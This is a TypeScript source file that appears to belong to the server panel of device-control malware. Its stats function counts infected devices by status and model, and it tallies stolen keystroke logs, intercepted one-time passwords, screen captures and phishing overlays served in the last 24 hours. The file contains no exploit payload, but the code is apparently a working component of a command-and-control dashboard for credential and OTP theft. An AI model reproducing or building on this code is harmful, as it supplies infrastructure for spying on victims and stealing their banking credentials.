import { count, eq } from 'drizzle-orm';
import type { StatsRes } from '@xrc/shared';
import { getDb } from '../db/index.js';
import { devices } from '../db/schema.js';
import { countCommandsLike, countEvents24h } from './eventStore.js';

export function getStats(): StatsRes {
  const db = getDb();
  const rows = db.select().from(devices).all();
  const totalDevices = rows.length;
  const online = rows.filter((r) => r.status === 'online').length;
  const frozen = rows.filter((r) => r.status === 'frozen').length;
  const byModel: Record<string, number> = {};
  for (const r of rows) byModel[r.model] = (byModel[r.model] ?? 0) + 1;
  const connectedNow = db
    .select({ n: count() })
    .from(devices)
    .where(eq(devices.status, 'online'))
    .get()?.n ?? 0;
  void connectedNow;
  return {
    totalDevices,
    online,
    frozen,
    keylogs24h: countEvents24h('keylog'),
    otps24h: countEvents24h('otp'),
    captures24h: countEvents24h('capture'),
    overlaysServed: countCommandsLike('%0xOV%'),
    byStatus: { online, offline: totalDevices - online - frozen, frozen },
    byModel,
  };
}
